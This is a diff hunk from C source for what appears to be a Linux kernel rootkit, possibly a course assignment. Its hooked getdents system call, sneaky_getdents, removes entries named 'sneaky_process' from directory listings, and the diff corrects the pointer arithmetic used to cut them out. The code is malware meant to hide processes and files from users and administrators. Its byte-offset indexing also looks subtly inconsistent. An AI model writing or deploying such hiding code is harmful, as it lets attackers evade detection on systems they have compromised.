@@ -85,16 +85,16 @@ asmlinkage int sneaky_getdents (unsigned int fd,
     if (strcmp(dirp[i].d_name, "sneaky_process") == 0) {
       skipped_size += (int)(dirp[i].d_reclen);
       
-      void* unexamined_start = (void*)(dirp[i]) + dirp[i].d_reclen;
+      void* unexamined_start = (void*)(&dirp[i]) + dirp[i].d_reclen;
       int unexamined_size = dirent_size - examined_size - skipped_size;
-      memmove((void*)(dirp[i]),
+      memmove((void*)(&dirp[i]),
 	      unexamined_start,
 	      unexamined_size);
       // i stays the same here, do not update!
       
     } else {
       examined_size += (int)(dirp[i].d_reclen);
-
+      
       // update i here
       i +=  (int)(dirp[i].d_reclen);
     }
